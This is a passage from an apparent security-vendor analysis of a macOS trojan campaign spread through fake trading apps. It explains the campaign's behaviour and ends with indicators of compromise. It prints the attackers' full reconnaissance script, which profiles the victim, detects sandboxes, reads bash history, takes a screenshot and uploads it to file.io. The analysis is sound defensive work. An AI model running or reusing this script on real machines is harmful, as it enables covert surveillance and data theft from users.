https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-8.-Packet-capture-of-the-operator-sending-the-base64-encoded-secondary-reconnaissance-script.png 969w" sizes="(max-width: 600px) 100vw, 600px" /></a><p class="wp-caption-text"><i>Figure 8. Packet capture of the operator sending the base64-encoded secondary reconnaissance script</i></p></div>
<p>Here is the decoded script:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-6057fb248ed40915862955" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
echo ""
echo "------ Whoami ------"
whoami
echo "------ IP info ------"
curl -s ipinfo.io
echo "------ Mac Model ------"
curl -s https://support-sp.apple.com/sp/product?cc=$(system_profiler SPHardwareDataType | awk '/Serial/ {print $4}' | cut -c 9-) | sed 's|.*&lt;configCode&gt;\(.*\)&lt;/configCode&gt;.*|\1|'
echo "------ MacOS Version ------"
sw_vers -productVersion
sw_vers -productVersion | grep -E "10.15.*" &amp;&amp; echo -e "\033[1;31m CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA \033[0m"
sleep 1
echo "------ MacOS Installed ------"
date -r /var/db/.AppleSetupDone
echo "------ Disks ------"
df -m
echo "------ Video Output ------"
system_profiler SPDisplaysDataType
echo "------ Wifi Around ------"
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s
echo "------ Virtual Mashine Detector ------"
ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -E "irtual|racle|ware|arallels" || echo "Probably not a Virtual Mashine..."
echo "--------------------------------"
echo "------ Developer Detector ------"
echo "--------------------------------"
echo "||| Applications |||"
ls -laht /Applications | grep -E "Xcode|ublime|ourceTree|Atom|MAMP|TextWrangler|Code|ashcode" &amp;&amp; echo "-|Be Carefull|-"
echo "||| Short Bash History |||"
cat ~/.bash_history | head -n 20
echo "------ Desktop Screen ------"
echo "create screenshot..."
sw_vers -productVersion | grep -E "10.15.*" &amp; screencapture -t jpg -x /tmp/screen.jpg &amp;&gt; /dev/null
sips -z 500 800 /tmp/screen.jpg &amp;&gt; /dev/null
sips -s formatOptions 50 /tmp/screen.jpg &amp;&gt; /dev/null
echo "uploading..."
curl -s -F "file=@/tmp/screen.jpg" https://file.io</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-6057fb248ed40915862955-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed40915862955-2">2</div><div class="crayon-num" data-line="crayon-6057fb248ed40915862955-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed40915862955-4">4</div><div class="crayon-num" data-line="crayon-6057fb248ed40915862955-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed40915862955-6">6</div><div class="crayon-num" data-line="crayon-6057fb248ed40915862955-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed40915862955-8">8</div><div class="crayon-num" data-line="crayon-6057fb248ed40915862955-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed40915862955-10">10</div><div class="crayon-num" data-line="crayon-6057fb248ed40915862955-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed40915862955-12">12</div><div class="crayon-num" data-line="crayon-6057fb248ed40915862955-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed40915862955-14">14</div><div class="crayon-num" data-line="crayon-6057fb248ed40915862955-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed40915862955-16">16</div><div class="crayon-num" data-line="crayon-6057fb248ed40915862955-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed40915862955-18">18</div><div class="crayon-num" data-line="crayon-6057fb248ed40915862955-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed40915862955-20">20</div><div class="crayon-num" data-line="crayon-6057fb248ed40915862955-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed40915862955-22">22</div><div class="crayon-num" data-line="crayon-6057fb248ed40915862955-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed40915862955-24">24</div><div class="crayon-num" data-line="crayon-6057fb248ed40915862955-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed40915862955-26">26</div><div class="crayon-num" data-line="crayon-6057fb248ed40915862955-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed40915862955-28">28</div><div class="crayon-num" data-line="crayon-6057fb248ed40915862955-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed40915862955-30">30</div><div class="crayon-num" data-line="crayon-6057fb248ed40915862955-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed40915862955-32">32</div><div class="crayon-num" data-line="crayon-6057fb248ed40915862955-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed40915862955-34">34</div><div class="crayon-num" data-line="crayon-6057fb248ed40915862955-35">35</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-6057fb248ed40915862955-1"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">""</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed40915862955-2"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"------ Whoami ------"</span></div><div class="crayon-line" id="crayon-6057fb248ed40915862955-3"><span class="crayon-e">whoami</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed40915862955-4"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"------ IP info ------"</span></div><div class="crayon-line" id="crayon-6057fb248ed40915862955-5"><span class="crayon-v">curl</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-v">ipinfo</span><span class="crayon-sy">.</span><span class="crayon-e">io</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed40915862955-6"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"------ Mac Model ------"</span></div><div class="crayon-line" id="crayon-6057fb248ed40915862955-7"><span class="crayon-v">curl</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-v">https</span><span class="crayon-o">:</span><span class="crayon-c">//support-sp.apple.com/sp/product?cc=$(system_profiler SPHardwareDataType | awk '/Serial/ {print $4}' | cut -c 9-) | sed 's|.*&lt;configCode&gt;<span class="crayon-sy">\</span><span class="crayon-sy">(</span><span class="crayon-sy">.</span><span class="crayon-o">*</span><span class="crayon-sy">\</span><span class="crayon-sy">)</span>&lt;/configCode&gt;.*|\1|'</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed40915862955-8"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"------ MacOS Version ------"</span></div><div class="crayon-line" id="crayon-6057fb248ed40915862955-9"><span class="crayon-v">sw_vers</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">productVersion</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed40915862955-10"><span class="crayon-v">sw_vers</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">productVersion</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">grep</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">E</span><span class="crayon-h"> </span><span class="crayon-s">"10.15.*"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">echo</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">e</span><span class="crayon-h"> </span><span class="crayon-s">"\033[1;31m CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA \033[0m"</span></div><div class="crayon-line" id="crayon-6057fb248ed40915862955-11"><span class="crayon-i">sleep</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed40915862955-12"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"------ MacOS Installed ------"</span></div><div class="crayon-line" id="crayon-6057fb248ed40915862955-13"><span class="crayon-v">date</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-t">var</span><span class="crayon-o">/</span><span class="crayon-v">db</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-e">AppleSetupDone</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed40915862955-14"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"------ Disks ------"</span></div><div class="crayon-line" id="crayon-6057fb248ed40915862955-15"><span class="crayon-v">df</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">m</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed40915862955-16"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"------ Video Output ------"</span></div><div class="crayon-line" id="crayon-6057fb248ed40915862955-17"><span class="crayon-e">system_profiler </span><span class="crayon-e">SPDisplaysDataType</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed40915862955-18"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"------ Wifi Around ------"</span></div><div class="crayon-line" id="crayon-6057fb248ed40915862955-19"><span class="crayon-o">/</span><span class="crayon-v">System</span><span class="crayon-o">/</span><span class="crayon-v">Library</span><span class="crayon-o">/</span><span class="crayon-v">PrivateFrameworks</span><span class="crayon-o">/</span><span class="crayon-v">Apple80211</span><span class="crayon-sy">.</span><span class="crayon-v">framework</span><span class="crayon-o">/</span><span class="crayon-v">Versions</span><span class="crayon-o">/</span><span class="crayon-v">Current</span><span class="crayon-o">/</span><span class="crayon-v">Resources</span><span class="crayon-o">/</span><span class="crayon-v">airport</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">s</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed40915862955-20"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"------ Virtual Mashine Detector ------"</span></div><div class="crayon-line" id="crayon-6057fb248ed40915862955-21"><span class="crayon-v">ioreg</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">l</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">grep</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">e</span><span class="crayon-h"> </span><span class="crayon-v">Manufacturer</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">e</span><span class="crayon-h"> </span><span class="crayon-s">'Vendor Name'</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">grep</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">E</span><span class="crayon-h"> </span><span class="crayon-s">"irtual|racle|ware|arallels"</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"Probably not a Virtual Mashine..."</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed40915862955-22"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"--------------------------------"</span></div><div class="crayon-line" id="crayon-6057fb248ed40915862955-23"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"------ Developer Detector ------"</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed40915862955-24"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"--------------------------------"</span></div><div class="crayon-line" id="crayon-6057fb248ed40915862955-25"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"||| Applications |||"</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed40915862955-26"><span class="crayon-v">ls</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">laht</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">Applications</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">grep</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">E</span><span class="crayon-h"> </span><span class="crayon-s">"Xcode|ublime|ourceTree|Atom|MAMP|TextWrangler|Code|ashcode"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"-|Be Carefull|-"</span></div><div class="crayon-line" id="crayon-6057fb248ed40915862955-27"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"||| Short Bash History |||"</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed40915862955-28"><span class="crayon-v">cat</span><span class="crayon-h"> </span><span class="crayon-o">~</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-v">bash_history</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">head</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">n</span><span class="crayon-h"> </span><span class="crayon-cn">20</span></div><div class="crayon-line" id="crayon-6057fb248ed40915862955-29"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"------ Desktop Screen ------"</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed40915862955-30"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"create screenshot..."</span></div><div class="crayon-line" id="crayon-6057fb248ed40915862955-31"><span class="crayon-v">sw_vers</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">productVersion</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">grep</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">E</span><span class="crayon-h"> </span><span class="crayon-s">"10.15.*"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-v">screencapture</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">t</span><span class="crayon-h"> </span><span class="crayon-v">jpg</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">x</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">tmp</span><span class="crayon-o">/</span><span class="crayon-v">screen</span><span class="crayon-sy">.</span><span class="crayon-v">jpg</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">dev</span><span class="crayon-o">/</span><span class="crayon-t">null</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed40915862955-32"><span class="crayon-v">sips</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">z</span><span class="crayon-h"> </span><span class="crayon-cn">500</span><span class="crayon-h"> </span><span class="crayon-cn">800</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">tmp</span><span class="crayon-o">/</span><span class="crayon-v">screen</span><span class="crayon-sy">.</span><span class="crayon-v">jpg</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">dev</span><span class="crayon-o">/</span><span class="crayon-t">null</span></div><div class="crayon-line" id="crayon-6057fb248ed40915862955-33"><span class="crayon-v">sips</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-i">formatOptions</span><span class="crayon-h"> </span><span class="crayon-cn">50</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">tmp</span><span class="crayon-o">/</span><span class="crayon-v">screen</span><span class="crayon-sy">.</span><span class="crayon-v">jpg</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">dev</span><span class="crayon-o">/</span><span class="crayon-t">null</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed40915862955-34"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"uploading..."</span></div><div class="crayon-line" id="crayon-6057fb248ed40915862955-35"><span class="crayon-v">curl</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">s</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">F</span><span class="crayon-h"> </span><span class="crayon-s">"file=@/tmp/screen.jpg"</span><span class="crayon-h"> </span><span class="crayon-v">https</span><span class="crayon-o">:</span><span class="crayon-c">//file.io</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0009 seconds] -->
<p>&nbsp;</p>
<p>This script is actually very similar of the <span style="font-family: courier new, courier, monospace;">plugin</span> file found in one of the Stockfolio samples <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/mac-malware-that-spoofs-trading-app-steals-user-information-uploads-it-to-website/" target="_blank" rel="noopener">analyzed last year</a>. However, in the more recent campaigns, they chose to send the reconnaissance script over the network to interesting victims only. It was also updated to include some additional information.</p>
<div id="attachment_140782" style="width: 610px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-9.-Report-output-that-would-be-seen-on-an-operators-terminal-reconstructed-from-packet-capture.png"><img class="wp-image-140782" src="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-9.-Report-output-that-would-be-seen-on-an-operators-terminal-reconstructed-from-packet-capture-150x150.png" alt="" width="600" height="235" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-9.-Report-output-that-would-be-seen-on-an-operators-terminal-reconstructed-from-packet-capture-300x118.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-9.-Report-output-that-would-be-seen-on-an-operators-terminal-reconstructed-from-packet-capture-768x301.png 768w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-9.-Report-output-that-would-be-seen-on-an-operators-terminal-reconstructed-from-packet-capture-1024x401.png 1024w" sizes="(max-width: 600px) 100vw, 600px" /></a><p class="wp-caption-text"><i>Figure 9. Report output that would be seen on an operator&#8217;s terminal (reconstructed from packet capture)</i></p></div>
<p>We’ll go over each section of the script here:</p>
<ul>
<li>It gets the full report about the external IP from ipinfo.io</li>
<li>It checks for Mac model by using the last 4 digits of the Mac serial number and an HTTP service provided by Apple to translate it to a friendly name such as “MacBook Pro (Retina, 15-inch, Late 2013)”. Virtual machines likely have invalid serial numbers and may not display a model here.</li>
<li>It outputs the version of macOS installed. There is a rather big red (using ANSI escape sequence), all caps warning when the computer is running macOS Catalina (10.15). We think we understand why and talk about it later.</li>
<li>It checks when macOS was installed using the modification time of the <span style="font-family: courier new, courier, monospace;">/var/db/.AppleSetupDone.</span></li>
<li>It outputs the disk usage and connected monitors’ details.</li>
<li>It lists available Wi-Fi networks. Honeypots are likely to have Wi-Fi disabled.</li>
<li>It detects whether the computer is a VMware, Parallels or VirtualBox virtual machine by looking at the vendor strings of connected devices.</li>
<li>It checks whether common text editors or IDE applications are installed and warns operators to “Be Carefull” (sic) because this victim could be more computer savvy than usual.</li>
<li>It gets the first (i.e. oldest) 20 commands from the bash history file.</li>
<li>Finally, it takes a screenshot, resizes it and uploads it to file.io. It checks to see whether the system is running macOS Catalina before doing so, but an error in the script makes this check useless. The “&amp;” control operator, which starts commands in parallel, is used instead of the logical <em>AND</em> (“&amp;&amp;”) operator. This means the screen capture is taken regardless of the macOS version.</li>
</ul>
<p>The fact that a screenshot should not be taken on Catalina and that an obvious warning sign will be displayed on the operator’s terminal made us wonder why they act differently on the current macOS version. It turns out that Catalina added a feature where recording the screen or taking a screenshot <a href="https://support.apple.com/guide/mac-help/control-access-to-screen-recording-on-mac-mchld6aa7d23/" target="_blank" rel="noopener">must be approved by the user</a> for each application. We tested taking a screenshot from the reverse shell on Catalina and ended up with the following warning in our sandbox, which is rather suspicious considering a trading application has no business doing so.</p>
<div id="attachment_140783" style="width: 475px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-10.-macOS-Catalina-warning-should-the-operators-try-taking-a-screenshot.png"><img class="wp-image-140783 size-full" src="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-10.-macOS-Catalina-warning-should-the-operators-try-taking-a-screenshot.png" alt="" width="465" height="176" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-10.-macOS-Catalina-warning-should-the-operators-try-taking-a-screenshot.png 465w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-10.-macOS-Catalina-warning-should-the-operators-try-taking-a-screenshot-300x114.png 300w" sizes="(max-width: 465px) 100vw, 465px" /></a><p class="wp-caption-text"><i>Figure 10. macOS Catalina warning should the operators try taking a screenshot</i></p></div>
<p>Should a compromised system be considered interesting, the exfiltration phase begins. Interesting files are compressed into a ZIP archive and uploaded via HTTP to yet another server, also under the control of the attackers.</p>
<div id="attachment_140784" style="width: 610px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-11.-Packet-capture-of-an-operator-using-the-reverse-shell-to-exfiltrate-browser-cookies.png"><img class="wp-image-140784" src="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-11.-Packet-capture-of-an-operator-using-the-reverse-shell-to-exfiltrate-browser-cookies-150x150.png" alt="" width="600" height="421" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-11.-Packet-capture-of-an-operator-using-the-reverse-shell-to-exfiltrate-browser-cookies-300x210.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-11.-Packet-capture-of-an-operator-using-the-reverse-shell-to-exfiltrate-browser-cookies-768x539.png 768w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-11.-Packet-capture-of-an-operator-using-the-reverse-shell-to-exfiltrate-browser-cookies-1024x718.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-11.-Packet-capture-of-an-operator-using-the-reverse-shell-to-exfiltrate-browser-cookies.png 1364w" sizes="(max-width: 600px) 100vw, 600px" /></a><p class="wp-caption-text"><i>Figure 11. Packet capture of an operator using the reverse shell to exfiltrate browser cookies</i></p></div>
<p>It’s funny to note here the <span style="font-family: courier new, courier, monospace;">/tmp/h.zip</span> file did not exist. Perhaps they copy-and-pasted some command that was used for another victim.</p>
<p>Based on the activity we have witnessed, we conclude that some of the interests of the operators of this malware are:</p>
<ul>
<li>Browser information (cookies, history)</li>
<li>Cryptocurrency wallets</li>
<li>Screen captures</li>
</ul>
<h2>Conclusion</h2>
<p>The numerous campaigns run by this group show how much effort they’ve expended over the last year to compromise Mac users doing online trading. We still aren’t sure how someone becomes a victim, downloading one of the trojanized applications, but the hypothesis of the operators directly contacting their targets and socially engineering them into installing the malicious application seems the most plausible.</p>
<p>It is interesting to note how the malware operation is more limited on the most recent version macOS. We did not see the operators try to circumvent the limitation surrounding screen captures. Further, we believe that the only way that they could see the computer screen on victim machines running Catalina would be to exfiltrate existing screenshots taken by the victim. This is a good, real-world example of a mitigation implementation in the operating system that has worked to limit the activities of malefactors.</p>
<h2>Indicators of Compromise (IoCs)</h2>
<h3>Samples</h3>

<table id="tablepress-858" class="tablepress tablepress-id-858">
<thead>
<tr class="row-1 odd">
	<th class="column-1">SHA-1</th><th class="column-2">Filename</th><th class="column-3">ESET detection name</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">2AC42D9A11B67E8AF7B610AA59AADCF1BD5EDE3B</span></td><td class="column-2"><span style="font-family: courier new, courier, monospace;">Licatrade.zip</span></td><td class="column-3">multiple threats</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">560071EF47FE5417FFF62CB5C0E33B0757D197FA</span></td><td class="column-2"><span style="font-family: courier new, courier, monospace;">Licatrade.app/Contents/Resources/run.sh</span></td><td class="column-3">OSX/Agent.BA</td>
</tr>
<tr class="row-4 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">4C688493958CC7CCCFCB246E706184DD7E2049CE</span></td><td class="column-2"><span style="font-family: courier new, courier, monospace;">Licatrade.app/Contents/MacOS/Licatrade</span></td><td class="column-3">OSX/Agent.BA</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">9C0D839D1F3DA0577A123531E5B4503587D62229</span></td><td class="column-2"><span style="font-family: courier new, courier, monospace;">Cointrazer.zip</span></td><td class="column-3">multiple threats</td>
</tr>
<tr class="row-6 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">DA1FDA04D4149EBF93756BCEF758EB860D0791B0</span></td><td class="column-2"><span style="font-family: courier new, courier, monospace;">Cointrazer.app/Contents/Resources/nytyntrun.sh</span></td><td class="column-3">OSX/Agent.AZ</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">F6CD98A16E8CC2DD3CA1592D9911489BB20D1380</span></td><td class="column-2"><span style="font-family: courier new, courier, monospace;">Cointrazer.app/Contents/MacOS/Cointrazer</span></td><td class="column-3">OSX/Agent.BA</td>
</tr>
<tr class="row-8 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">575A43504F79297CBFA900B55C12DC83C2819B46</span></td><td class="column-2"><span style="font-family: courier new, courier, monospace;">Stockfolio.zip</span></td><td class="column-3">multiple threats</td>
</tr>
<tr class="row-9 odd">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">B8F19B02F9218A8DD803DA1F8650195833057E2C</span></td><td class="column-2"><span style="font-family: courier new, courier, monospace;">Stockfolio.app/Contents/MacOS/Stockfoli</span></td><td class="column-3">OSX/Agent.AZ</td>
</tr>
<tr class="row-10 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">AF65B1A945B517C4D8BAAA706AA19237F036F023</span></td><td class="column-2"><span style="font-family: courier new, courier, monospace;">Stockfolio.app/Contents/Resources/run.sh</span></td><td class="column-3">OSX/Agent.AZ</td>
</tr>
</tbody>
</table>

<h3>Code signing certificate</h3>

<table id="tablepress-859" class="tablepress tablepress-id-859">
<thead>
<tr class="row-1 odd">
	<th class="column-1">App name</th><th class="column-2">Fingerprint (SHA-1)</th><th class="column-3">Developer identity</th><th class="column-4">Valid from</th><th class="column-5">App signed on</th><th class="column-6">Revoked on</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">Stockfolio</td><td class="column-2"><span style="font-family: courier new, courier, monospace;">E5D2C7FB4A64EAF444728E5C61F576FF178C5EBF</span></td><td class="column-3">Levis Toretto <span style="font-family: courier new, courier, monospace;">(9T4J9V8NV5)</span></td><td class="column-4">2018-11-25</td><td class="column-5">2019-04-18</td><td class="column-6">2019-07-26</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">Cointrazer</td><td class="column-2"><span style="font-family: courier new, courier, monospace;">1BC8EA284F9CE5F5F68C68531A410BCC1CE54A55</span></td><td class="column-3">Andrei Sobolev <span style="font-family: courier new, courier, monospace;">(A265HSB92F)</span></td><td class="column-4">2019-10-17</td><td class="column-5">2019-10-17</td><td class="column-6">2020-04-16</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">Licatrade</td><td class="column-2"><span style="font-family: courier new, courier, monospace;">BDBD92BFF8E349452B07E5F1D2883678658404A3</span></td><td class="column-3">Andrey Novoselov <span style="font-family: courier new, courier, monospace;">(M8WVDT659T)</span></td><td class="column-4">2020-04-06</td><td class="column-5">2020-04-15</td><td class="column-6">2020-05-28</td>
</tr>
</tbody>
</table>

<h3>Network</h3>
<h4><strong>Domain names</strong></h4>
<p>• repbaerray.pw<br />
• macstockfolio.com<br />
• latinumtrade.com<br />
• trezarus.com<br />
• trezarus.net<br />
• cointrazer.com<br />
• apperdenta.com<br />
• narudina.com<br />
• nagsrsdfsudinasa.com<br />
• cupatrade.com<br />
• stepbystepby.com<br />
• licatrade.com<br />
• creditfinelor.com<br />
• maccatreck.com</p>
<h3>IP addresses</h3>
<p>• 85.209.88.123<br />
• 85.217.171.87<br />
• 193.37.214.7<br />
• 193.37.212.97</p>
<h3>Host-based indicators</h3>
